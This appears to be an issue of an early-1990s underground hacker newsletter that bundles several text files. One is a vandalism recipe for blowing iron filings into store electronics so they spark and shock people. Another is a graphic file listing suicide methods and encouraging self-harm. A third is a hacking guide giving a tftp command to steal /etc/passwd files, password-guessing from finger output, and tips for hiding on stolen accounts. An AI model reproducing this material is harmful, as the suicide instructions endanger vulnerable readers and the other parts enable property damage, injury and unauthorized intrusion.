        Hello to all and to all hello,
                I have found myself in a slump, I can not get myself to get
these news letters out on time.  This news letter is over 3 months late.  Of
course I have at last got it done and I hope to continue with IRG for a few
more years.  Or until the world ends (the rise of the third Anti-Christ is
suppost to happen in 1992!!).  Welcome to IRG Number 7!!!

7.30 More About IRG
-------------------
        IRG is doing rather good and alot more people have heard about it then
I thought.  It seems though that the old age of hackers is over and a whole new
generation of younger hackers is here.  I never see the old names of hackers
around anymore, or even hear about any realy exciting new one!  There are of
course those Neo-Great Hackers that I am happy to find running around in places
but it seems that often when a hacker gets to the level that people have heard
of him, then he gets caught by the Feds or disappears for a time.  Control - S
is one such person, HEY WHERE THE HELL ARE YOU???? He just suddenly disapeared
on day.  Another hacker and member of IRG, Damaged Sectorz was arrest for
hacking and a bunch of other crap and I fear we will not be seeing him again
for a long time.  This makes me sad and also angry.  Doesn't the Goverment know
that it cannot get rid of hackers and rebels?  Well actualy they can I have
developed a plan that will stop all hackers and rebels FOREVER!  Because you
must remember Hackers are rebels...

        1. Start with a monthly purge of all youth computer equipment.  Anyone
        under the age of 30 should have there computers confescated and
        destoried.

        2. Arrest anyone who uses the phone for an other reason then to plan
        meetings to talk in person.

        3. Kill all violators of numbers 2 and 3.
        
        4. Kill anyone who can think.
        
This little idea is for The FBI no one else is to take it serouisly, of course
if any number is not done then it will not work at all.  Because hacking is an
Idea and ideas cannot be destoryed unless they kill everyone who can think.
There is another name for hacking, or thinking or, its called ThoughtCrime.
Yes that is from 1984 the book, but I have been reading it and found that there
are alot of things that make sense even today.  I know there is not as much
oppression as in the book 1984, but it is overly strong to make a point.  To
get us to think!
        I when into the store InnerWorld the other day and on the wall was a
big sign that said "ALL YOUTHS ARE BASICLY CRIMINALS SO WE ARE WATCHING YOU."
I laughed at first then it dawned on me how true this was.  All youths basicly
are criminals and the goverment watchs us.  Then I thought who cares if they
watch us we just stay with in the bondary of the law until they blink then bamb
we do something illegal.  Then I thought of all the hackers outhere.  Shit we
have so much power but we don't even put it to use.  If the goverment wants to
fuck with us then lets fuck with them.  We could easly turn the whole
Tele-Compumications into a hell that even the goverment would have a hard time
cleaning up.  We need to band together and take to arms.  There needs to be
more organization of hackers world wide.  But I fear it will never happen
becuase people don't believe in themself.  They don't believe in the power that
they hold.  And instead they would rather fight amoung themselves.  They would
rather crash each others GOOD elite boards and bother each other.
        I was reading this book called Hackers, and it was pretty lame, it was
suppost to be about the new "Hacker age" but it only talked about people who
had been busted or had never really been good hackers.  It mentioned something
called The Hacker Ethics, which I had only heard of once and that was in a
Phrack Issue, I think, but I never heard much of it.  I decided to re-write
these Hacker Ethics and to try to organize the Hacker Age.  Next issue I will
have The Neo-Hacker Ethics for everyone to follow if they would like.

                        Written Exclusively for The IRG


If you're like me, nothing warms your heart more than a little random, 
senseless destruction of someone else's property. The following recipe for 
destruction has been totally Vandal Tested & Approved, and, when properly 
applied, is guaranteed to put a little excitement back into anyone's life, no 
matter how fucking miserable they are, including you and the person you're 
working this special brand of Voo-Doo on...

LIST OF INGREDIENTS:
                       1-Hunk of iron, any shape
                       1-Bench grinder (a common file
                         may be substituted, if you've
                         got a lot of time to waste)
                       1-Box of Nerds candy

INSTRUCTIONS:
                Put on a pair of safety goggles, and start grinding the shit
                out of the piece of iron you have chosen. Do this for several
                minutes, or until you have amassed a pretty good-sized pile of
                iron filings. Examine the box of Nerds closely; You will find
                that the box is split into two sections, with a different
                flavor in each side, both having a handy pour spout with a
                sliding cover. Open one side of the Nerds candy. You can either
                eat the shitty candy or just toss it- it's not important. Go
                ahead and open the other side of the box, but leave the candy
                intact, as it can come in handy later as an "alibi" of sorts
                (this will be explained farther down). Now, using a magnet,
                pick up all the iron filings you can and stuff them into the     
                empty side of the Nerds box. CONGRATULATIONS! You now hold in
                your hand the EVIL powers of ELECTRONIC VOO-DOO, thus making     
                you a High Priest witchdoctor extraordinare, or a "Voudoun",
                as Voo-Doo practicioneers in Haiti and New Orleans call it.
                Now, bop on down to your local mall to try your first hexings.

APPLICATIONS:
                The first step in freeing the evil spirits or "legba", that
                you now control, is to find some hi-tech electronic stuff,
                the more expensive, the better- Audio/Video & Computer stores
                are ideal targets.

                Having located one of the aforementioned establishments, you
                are now ready to begin. Take out the Nerds box, and shake a
                little Voo-Doo Powder into your hand. Now, pick a real nice
                piece of equipment (such as a Multi-CD player or 486 computer),  
                that is turned OFF, and gently blow the powder inside. In the    
                case of the computer, you may have to content your self with
                simply tossing the powder into the air vents in the back-
                this is not as effective as you can get, but will usually work 
                nicely. VCRs and CD-players work best, as you can easily gain 
                access to the inner-workings by the small door in the front of 
                the machine.

                After working your evil magic, stand around and wait for some 
                hapless fucker to either ask for a demonstration of a machine 
                you have hexed, or (better yet) turn the machine on himself. 
                Regardless of who does turn it on, the evil Electronic Demons 
                will be summoned forth, and the machine will erupt in sparks, 
                smoke, and quite possibly flame. And, as an added attraction, 
                the asshole turning it on just might get zapped real good in 
                the process.

                HAH! FEEL THE POWER! Isn't it GREAT?!? However, one must use 
                the Powers of Darkness wisely, or risk punishment by a Higher 
                Authority (like the police). It's NOT a good idea to hex more 
                than two or three machines in any particular store. Should 
                someone spot you with the box and ask you what the hell it is, 
                you simply say: "Nerds, Man... Ya want some?", while shaking a 
                handful out and popping them into your mouth. Always be sure 
                which side really IS candy, otherwise you're pretty much 
                screwed.

                And now, with the occultic knowledge that has been bestowed 
                upon you, venture forth into that vast gleaming Mecca of glass 
                and steel known cryptically as "The Mall" and have some REAL 
                FUN with senseless, random DESTRUCTION via ELECTRONIC 
                VOO-DOO!!!


                Thanks to: Haywire & the other members of the MIGHTY IRG!

 Special Thanks to: Randy Metler, wherever you are (prison, most likely), for
                the original inspiration for this idea.

 @ InTroductiOn @

  Ok well welcome to another G-Phile Phrom Me. whoaaaaa.  Anywayz today boys &
 Chicks we will be discuss'n the Many Phine Arts of Commit'n Suicide.  Yes you
 too can die in an artful manner that all Anrchists would be proud of.  Of
 course that's only if you can make the headlines and you only get one chance
 to do it.  So Be artful in your die'n way.  <fart> a smile comes my phace as
 i type this g-file.


 @ Basic Suicide Techniques @


  ! Usage of Sharp Objects !

   Well most people think that cut'n your wrists phrom left to right does the
  job.  In some cases it does if you bleed like water.  If not then do not
  attempt to do this then.  The proper way to slice'n is to take a razor blade
  , start'n at base of bottom of your arm at yer elbow.  Now go deep into the
  skin drag it slowly to the base of your hand.  Now if your the type that
  doesn't like pain, take some ice and freeze your arm Phor about 10 minutes.
  Now put your arm under some warm runn'n water to prevent clot'n.

   Ok now another one.  Take a razor blade and make incision at the base of
  yer neck.  You have to cut all the way through.  When you do this blood will
  phill up your lungs.  Thus cause'n you to drown on your own blood.

  ! Usage of Rope Bondage !

   Talk about Hang'n tough.  Obtain a good study rope.  If you the type that
  wants to get it done an over with.  just tie the rope around your neck real
  tight.  If you want to die by a hangman's noose, look at the diagram below
  to postion the rope correctly.
               _
              | |
              | |  _______ <--  Now take this end and wrap it around
              | | |             13 times.
              | |_|

   After you have phinished this.  Tighten it up by pull'n on of the ends.
  Welps you need a place to hang yourself Phrom.  Well you can go to your
  neighbor's yard and hang yerself Phrom his/her tree.  Or phind a bridge
  and try it phrom there.

     Quote "Death by no breath"

  ! OverDose'n & Poisons !

   Well this technique is one of the most popular ones around to do.  It's
  sometimes phast, enjoyable, or you won't even notice that you even died.
  Now you have some choices, what drug should be the proud winner to take
  your life?  Examine the List below.


  Sleep'n Pills - Take a whole bottle or two.  Cause'n you to phall asleep
                  and never wake up.  You can obtain this at any drug store.

  Cyanide - Well it will kill you in 3 seconds or less.  You have to look
            around Phor this one.

  House Hold Cleaners - Now you have to experiment with each one to see
                        what the effects are.  But some goodies are bleach,
                        amonia(so phuck'n what if it's misspelled).


  Fertilizer - go to a nature store of some sort.  just down some fertilizer.
               Now Phrom what i understand you can use Black Leaf 40 or 4.  Not
               sure but it kills very quickly.

  Other Drugs - Hell go to your mom's medicine cabinet and down whatever you
                can phind.

  Acid - Take about 40 or so blots and really massivly phry big time.  And
         they say die'n isn't really that colorful.

  Alcohol - Drink loads and loads of this shit and die Phrom Intoxication.


  ! Usage of Guns !

   Well this section is a real basic.  Just take da gun, put it to yer temple
  and BOOM.  Now all you brains slowly ozze out.  Now you can survive this
  sometimes.  So phor the most effective technique is to put the barrel on
  the back of your neck where your head and your neck meet.  Or if you want
  the phountain effect, stick the gun into your mouth.  Point the barrel
  upwards.

  ! Other Shit !

   Ok well some other shit is to Jump off a 40 story build'n.  You can also
  lay on some railroad tracks.  If you do this wear some earplugs so you don't
  hear the train come'n and totally surprises the hell outta ya.


 @ Introduction 2 @

   huh? an introduction in the middle of a phile.  Yes so phuck'n what.  Now
  those last phew ways to die are really basic and BOR'N!!!  Hell if your
  going to die do it the stylish way.  Be creative, try to make the headlines,
  get national coverage and shit.  Cause great grief runn'n through your
  loves ones.  Hell record it too!! maybe they'll make a movie of it.  You
  never know until your try.  hell you'll never know.  here's a phew ideas
  i thought of.


 -Take an Axe and shove it through your phorehead and run into the live'n
  room.  Sit next to your mom and put your arm around her and watch tv.

 -Take the brake lights in your car and put the exposed wires into your gas
  tank. Now drive around Phor a while and slam on the brakes in a busy
  intersection.

 -Dose yerself in some gas.  Light yerself up and run down the street at
  Nighttime.

 -Jump off a phreeway pass into the rush hour traffic.

 -Drive your car into a gas tanker at about 90 miles an hour.

 -Phind some Dog, Horse or Cow shit.  you can phind this shit anywhere.
  Insert the shit into your mouth and inhale, do not swallow.

 -Slice your abdomenal area in to and I section.  How do you do this?  Well
  carve a really deep I into your belly start'n at the bottom of your rib
  cage and right Before where you might have pubic hair.  Carve a line up
  and down to connect the lines.  Peel back the skin and whoopie all yer guts
  Phall out onto the pavement.  This works real well in malls.

 -<yawn> Stick yer hands one a time into a garbage disposal.  Make sure the
  points are nice and sharp.

 -Shove a stick of dynamite up yer ass and light it.

 -Hell put a gun barrel up yer ass and phire it.

 -Ahh one of my favorties.  The old fashion Guiltine trick.  It's where the
  person's head is chopped off by a big ol' razor blade back in the old
  Phrench days.  Now this is the 90's, and this is more creative.  Go out and
  phind a car, could be yours, could be your neighbor's.  Jack up the car, now
  Take one of the phront tires off.  Tie a rope to the jack, so you can yank
  it and the car will phall.  Now put a brick or something to hold yer head up
  underneath the disc (where you taken the tire off).  now lay your head down
  and pull the son-ofa-bitch rope.  A little messy but who really cares. As
  long you get a nice phuneral where everyone wears black and should play
  Metallica "Fade to Black".

 -Take some Sleep'n Pills; Lots of them too.  Turn your oven on to Broil, and
  crawl inside of it and pass out.

 -Take a Broom Stick, sharpen one end of it to a real phine point.  Climb
  on top of yer house.  Stick the sharp end of the broom stick up yer ass and
  jump off the damn house.  Make sure you land on the broomstick Phor best
  results.

 -Snort or Drink Battery Acid.

 -Eat a lot of pinto beans and have the runs really bad.  Jump down after you
  beat yer pecker and stick yer head into the toliet bowl and drown.

 -Obtain a nail gun and shoot nails into your phorehead.

 -Ok make a noose as described earlier.  Now go to a 40 story build'n.  Take
  one end of the rope (not the noose) and tie it to a oak desk or something
  real heavy.  Slip on the noose onto your pecker real tight.  Jump outa the
  window.  You should phall and the your dick gets rip'd off.  And you go
  splat into the crowds below.


 @ Laturs @

  Well guys that all i have Phor right now, so go back and jerk yerselfs
 off to yer porno gifs or fli's.  No systems status this time, if your
 Elite you should be already on those systems.

Insanity, sysopof Insanity Lane), abou
t InterNet. I have not seen any files written for thenew comers to InterNet, so this will cover the basic commands, the use ofInterNet, and some tips for hacking through internet. This file will notcover hacking an account to get on internet. There is no MAGICAL way tohacking a UNIX system, i have found that brute force works best (Brute hackeris something different). Hacking snow balls, once you get the feel of it, itis all clock work from there. Well i hope you enjoy the file. If you have anyquesti
ons i can be reached on a number of boards. This file was written forhackers (like me) who do not go to school with a nice InterNet account, thisis purely written for hackers to move around effectively who are new toInterNet. NOTE this is written for hackers who know basic UNIX commands.The Crypt                   -  619/457+1836West Coast Technologies     -  213/274+1333Insanity Lane               -  619/591+4974  and any other good board  across the country.....Disclaimer~~~~~~~~~~fuck that

Here i
s the key.*  - Buffed from UNIX it self. You will find this on the left side of the     margin. This is normally "how to do" or just "examples" of what to do     when using InterNet.#  - This means these are commands, or something that must be typed in.What is The InterNet ?~~~~~~~~~~~~~~~~~~~~~~     To understand The InterNet you must first know what it is. The InterNetone of a group of various networks, ARPANET (an experimental WAN, which is nolonger in existence) was the first. This "group" 
of networks came togetherbecause of the expansion of LANs (Local Area Networks). LANscharacteristically having gateways to other LANs, thus forcing aInternational Protocol (x.75 in this case, but this is better know as IP orinternet protocol) to be established. This would allow everyone to send datato everyone. This group of WANs and LANs over time lead to the creation ofwhat we now know today as InterNet.    The Internet is really a PSN or packet switched network, but i would notthink of it as one 
because a normal PSN (TymNet, TeleNet) all have theprotocol of X.25, and internet is a protocol is a X.75 (though their aregateways between the two).  The InterNet should be though of as a "umbrella"network. This is composed of several large segments or subnetworks connectedtogether to form one interworking network. Where can you access InterNet ? ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   InterNet is most likely to be found on Local Area Networks or LANs andWide Area networks or WANs. LANs are defined as
 networks permitting theinterconnection and intercommunication of a group of computers, primarily forthe sharing of resources such as data storage device and printers. LANs covera short distance (less than a mile), almost always within a single buildingcomplex. Normally having gateways to InterNet, and in turn InterNet the backbone to the area network, but one could argue this point.   WANs are networks which have been designed to carry data calls over longdistances (many hundreds of miles). Thus als
o being (for the same reasonsLANs are) linked into the mix mash of PSS.   You can also access InterNet through TymNet via gateway. But i do nothappen to have the TymNet address now, just ask around.TAC~~~    TAC is another way to access internet, but due to the length of this part ijust made it another section.   TAC (terminal access controller) is another way to access InterNet. Thisis just dial-up terminal to a terminal access controller. You will need tohack out a password and account. TAC h
as direct access to MILNET (a part ofinternet, one of the networks in the group that makes up internet). A TAC dial up number is 18oo/368+2217 (this is just one, there are fulllists on any good text file board), and TAC information services from whichyou can try to social engineer a account (watch out their is a CERT report outabout this, for more information the CERT reports are available at128.237.253.5 anonymous ftp, more on that later), the number is 18oo/235+3155and 1415/859+3695. If you want th
e TAC manual you can write a letter to (besure an say you want the TAC user guide, 310-p70-74) :       Defense Communications Agency       Attn: Code BIAR       Washington, DC 2o3o5-2ooo To logon you will need a TAC Access Card, but your are a hacker, so I am notcounting on this (if you can get a card, you would get it from the DDN NIC).Here is a sample logon:Use Control-Q for help...** PVC-TAC 111: 01               \ TAC uses to this to identify itself* @ #o 124.32.5.82               \ Use

Once on the UNIX system you shouldsee a prompt, which can look like a '$', '%' of the systems name (alsodepending on what shell you 
are in, and the type of UNIX system). Now at theprompt you can do all the normal UNIX accounts, but when on a InterNet hostyou can type 'telnet' which will bring you to the 'telnet' prompt.** $ #telnet* ^   ^  |   |  |  the command that will bring you to the telnet prompt  |  a normal UNIX promptonce this is done you should see this:** telnet>*    At this prompt you will have a whole different set of commands which areas follow (NOTE taken from UCSD, so this may vary from place to place).
** telnet> #help** close           close current connection* display         display operating parameters* open            connect to a site* quit            exit telnet* send            transmit special character* set             set operating parameters* status          print status information* toggle          toggle operating parameters* ?               to see what you are looking at now*close      - this command is used to 'close' a connection, when multitasking             or jumping 
between systems.display    - this set the display setting, commands for this are as follow.             ^E    echo.             ^]    escape.             ^H    erase.             ^O    flushoutput.             ^C    interrupt.             ^U    kill.             ^\    quit.             ^D    eof.open       - type 'open [host]' to connect to a system** $ #telent ucsd.edu*     or** telnet> #open 125.24.64.32.1#*quit       - to get out of telnet, and back to UNIX.send       -  send 
filesset        -             echo    - character to toggle local echoing on/off             escape  - character to escape back to telnet command mode                The following need 'localchars' to be toggled true             erase         -  character to cause an Erase Character             flushoutput   -  character to cause an Abort Oubput             interrupt     -  character to cause an Interrupt Process             kill          -  character to cause an Erase Line             quit      
    -  character to cause a Break             eof           -  character to cause an EOF             ?             -  display help information?          -  to see the help screen ftp ANONYMOUS to a remote site ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    ftp or file transfer protocol is used to copy file from a remote host to
the one that you are on. You can copy anything from some ones mail to the
passwd file. Though security has really clamped down on the passwd flaw, but it
will still work here and there (always worth a shot). More on this later, lets
get an idea what it is first.     This could come in use full when you see a InterNet CuD site that accepts
a anonymous ftps, and you want to read the CuDs but do not feel like wasting
your time on boards d/ling them. The best way to start out is to ftp a
directory to see what you are getting (taking blind stabs is not worth a few
CuDs). This is done as follow: (the CuD site is InterNet address 192.55.239.132, and my account name is gats)** $ #ftp* ^  ^  |  |  | ftp command  | UNIX prompt** ftp> #open 192.55.239.132* Connected to 192.55.239.132* 220 192.55.239.132 FTP Server (sometimes the date, etc)* Name (192.55.239.132:gats): #anonymous*            ^         ^        ^             |         |        |             |         |       This is where you type 'anonymous' unless             |         |     you have a a
ccount 192.55.239.132.             |         |             |        This is the name of my account or [from]             |            This is the InterNet address or [to]** Password: #gats*            ^             |            For this just type your user name or anything you feel like            typing in at that time.** % ftp 192.55.239.132* Connected to 192.55.239.132* ftp> #ls*       ^        |       You are connected now, thus you can ls it.     Just move around like you would in a
 normal unix system. Most of thecommands still apply on this connection. Here is a example of me getting aElectronic Frontier Foundation Vol 1.04 from InterNet address 192.55.239.132.** % #ftp* ftp> #open 128.135.12.60* Trying 128.135.12.60...* 220 chsun1 FTP server (SunOS 4.1) ready.* Name (128.135.12.60:gatsby): anonymous* 331 Guest login ok, send ident as password.* Password: #gatsby* 230 Guest login ok, access restrictions apply.* ftp> #ls* 200 PORT command successful.* 150 ASCII data con

Now if thefiles are just too long you can 'xmodem' it off the host your on. Just type'xmodem' and that will make it much faster to get the files. Here is the setup (stol
en from ocf.berkeley.edu).   If you want to:                                         type:send a text file from an apple computer to the ME       xmodem ra <filename>send a text file from a non-apple home computer         xmodem rt <filename>send a non-text file from a home computer               xmodem rb <filename>send a text file to an apple computer from the ME       xmodem sa <filename>send a text file to a non-apple home computer           xmodem st <filename>send a non-text file to a home com
puter                 xmodem sb <filename>xmodem will then display:** XMODEM Version 3.6 -- UNIX-Microcomputer Remote File Transfer Facility* File filename Ready to (SEND/BATCH RECEIVE) in (binary/text/apple) mode* Estimated File Size (file size)* Estimated transmission time (time)* Send several Control-X characters to cancel*Hints - File transfer can be an iffy endeavor; one thing that can help is totell the annex box not to use flow control.  Before you do rlogin to anME machine, type st
ty oflow none stty iflow noneat the annex prompt.  This works best coming through 2-6092. Though i havenot found this on too many UNIX systems with the xmodem command, but where itis you can find me LeEcHiNg files.How to tftp the /etc/passwd File~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     Well there is a little trick that has been around a while. This trick itthe tftp (Trivial File Transfer Protocol, the command is not in caps, becauseUNIX is cap sensitive). This little trick will help you to "flip" t
he/etc/passwd file out of different sites. This can be real handy, you can havethe passwd file with out breaking into the system. Then just run Brute Hacker(the latest version) on the thing, thus you will save time, and energy.  This'hole' (NOTE the word 'hole' is not used in this case in the normal sense,the normal sense it a way to obtain super user status once in UNIX) may befound on SunOS 3.X, but have been fixed in 4.0. Though i have found this holein several other system, such as System V, BSD 
and a few others.     The only problem with this 'hole' is that the system manager willsometimes know that you are doing this (that is if the manager know what thehell he is doing). The problem occurs when attempts to tftp the /etc/passwdis done too many times, you may see this (or something like this) when youlogon on to your ? account. (This is what I buffed this offplague.berkeley.edu, hmm i think they knew what i was doing <g>).** DomainOS Release 10.3 (bsd4.3) Apollo DN3500 (host name):*    
     This account has been deactivated due to use in system cracking* activities (specifically attempting to tftp /etc/passwd files from remote* sites) and for having been used or broken in to from <where the calls are* from>.  If the legitimate owner of the account wishes it reactivated,* please mail to the staff for more information.** - Staff*    Though, if this is not done too much it can be a use full tool in hacking on InterNet. The tftp is used in this format is as follow: tftp -<command>
 <any name> <InterNet Address>  /etc/passwd  <netascii>Command      -g   is to get the file, this will copy the file onto                  your 'home' directory, thus you can do anything with                  the file.Any Name     If your going to copy it to your 'home' directory             you may want to name anything that is not already             used. I have found it best to name it 'a<and the internet             address>' or the internet address name, so I know             where is came f
rom.InterNet     This is the address that you want to snag the passwd file   Address   from.  I will not include any for there are huge list that other             hackers have scanned out, and I would be just copying their             data./etc/passwd  This is the file that you want, isn't it ? I do not think you             want John Jones mail. Well you could grab their mail, this             would be one way to do it.netascii     This how you want file transferred, you can also do it        
     Image, but i have never done this. I just leave it blank, and it             dose it for me.&            Welcome to the power of UNIX, it is multitasking, this little             symbol place at the end will allow you to do other things (such             as grab the passwd file from the UNIX that you are on).    Here is the set up:We want to get the passwd file from sunshine.ucsd.edu.The file is copying to your 'home' directory is going to be named'asunshine'.** $ #tftp -g asunshine sunshin
e.ucsd.edu /etc/passwd &*Fingering~~~~~~~~~   Fingering is a real good way to get account on remote sites. Typing 'who'of just 'finger <CR>' you can have names to "finger". This will give you allkinds info. on the persons account, thus you will have a better chance ofcracking that system. Here is a example of how to do it.** % #who* joeo                 ttyp0       Jun 10 21:50   (bmdlib.csm.edu)* gatsby               ttyp1       Jun 10 22:25   (foobar.plague.mil)* bbc                  crp00 
      Jun 10 11:57   (aogpat.cs.pitt.edu)* liliya               display     Jun 10 19:40* % #finger bbc* Login name: bbc                     In real life: David Douglas Cornuelle* Office: David D. Co* Directory: //aogpat/users_local/bdc     Shell: /bin/csh* On since Jun 10 11:57:46 on crp00 from aogpat   Phone 555-1212* 52 minutes Idle Time* Plan: I am a dumb fool!!* %*     From there i can just call 'aogpat.cs.pit.edu' and try to hack it out.Try the last name as the password, the first name, m
iddle name and try themall backwards (do i really need to explain it any more). The chances are realgood that you WILL get in since you now have something to work with.     If their are no users in line for you to type "who" you can just type"last" and all the user who logged on will come rolling out, and "finger"them.Hostname and Address~~~~~~~~~~~~~~~~~~~~  This is for those of who like to know what they are doing, and when itcomes to address, you will know what you are looking at.   Hostna
mes:   InterNet address are long and hard to remember such as 128.128.57.83. Ifyou had to remember all the hosts you are on you would need a really goodmemory which most people (like me) do not have. So Being humans (thus lazy)we came up with host names.        All hosts registered on the InterNet must have names that reflectthem domains under which they are registered. Such names are called FullyQualified Domain Names (FQDNs). Ok, lets take apart a name, and see suchdomains. lilac.berkeley.edu 
  ^      ^      ^   |      |      |   |      |      |____  ``edu'' shows that this host is sponsored by a   |      |               educational related organization. This is a   |      |               top-level domain.   |      |   |      |___________   ``berkeley'' is the second-level domain, this   |                       shows that it is an organization within UC   |                       Berkeley.   |   |__________________   ``lilac'' is the third-level domain, this indicates                  
         the local host name is 'lilac'.   Here is a list of top-level domain you will run into.      |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|      |            Common Top-Level Domains                 |      |                                                     |      |   COM  -  commercial enterprise                     |      |   EDU  -  educational institutions                  |      |   GOV  -  non-military government agencies          |      |   MIL  -  military (non-classif
ied)                 |      |   NET  -  networking entities                       |      |   ORG  -  nonprofit intuitions                      |      |                                                     |      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      Addressing:      A network address is that numeric address of a host, gateway or TAC.The address was though of with us in mind, meaning it is easy to scan(wardial, wonder etc..). The address are maid up of four decimals numbered
slots, which are separated by the well know dot called a period. The think Iwill place at the end of this sentence. See it, it is four word over from theword four. Now that we have that down <Grin>, we can move on. There are threeclasses that are used most, these are Class A, Class B, and Class C. I knowthis has nothing to do with you, but I feel you should know what they are...   Class A  -  from '0'    to  '127'   Class B  -  from '128'  to  '191'   Class C  -  from '192'  to  '223'Class A  - 
 Is for MILNET net hosts. The first part of the address has the            network number. The second is for the their physical PSN port            number, and the third is for the logical port number, since it is            on MILNET it is a MILNET host. The fourth part is for which PSN            is on. 29.34.0.9. '29' is the network it is on. '34'  means it is            on port '34'. '9' is the PSN number.Class B  -  This is for the InterNet hosts, the first two "clumps" are for            the n
etwork portion. The second two are for the local port.             128.28.82.1               \_/   \_/                |     |_____ Local portion of the address                |                |___________ Potation address.Class C  -  The first three "clumps" is the network portion. And the last one            is the local port.            193.43.91.1              ^  ^  ^ ^               \_|_/  |_____ Local Portation Address                 |                 |__________ Network Portation Addre
ssTips and Hints~~~~~~~~~~~~~~    When on a stolen account these are basic thing to do and not to to do.                 -   Do not logon too late at night. All the manager has to                     do is see when you logoned by typing "login". If it                     sees 3 am to 5 am he is going to know that you were                     in the system. I know, I love spending all night on a                     account, but the best times are in the middle of the day                     whe
n the normal (the owner) would use the account. (NOTE                     this is what they look for !)                 -   Do not leave files that were not there on *ANY*                     directory, checks are sometimes made. This is on a                     system security check list, which is normally done from                     time to time.                 -   When hacking, do not try to hack a account more than                     three times. It does show up on a logon file (when more   
                  than three try are made on the same account !), and it                     will also not let you logon on the account even if you                     do get it right (NOTE this is not on all UNIX systems).                 -   DO NOT CHANGE THE PASSWORD, if the real owner wants on                     he will have the account deleted. Well you could, but                     it will not last long.                 -   Do not type in your handle ! you real name etc etc..                 
-   DO send The Gatsby all the accounts you will get and                     have.!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@#$!@@#                         The Gatsby                                        #$                                                                           $!                          6, 1991-ish                                      !@                                                                           @#    At this time i would like to

7.60 Running The ShadowNet
--------------------------
        ShadowNet is kinda working but I was thinking of turning it into a
Virus Group or a kill group that works on Viruses and other such destructive
things.  Anyone who is good with Viruses out there please give my board a
call...
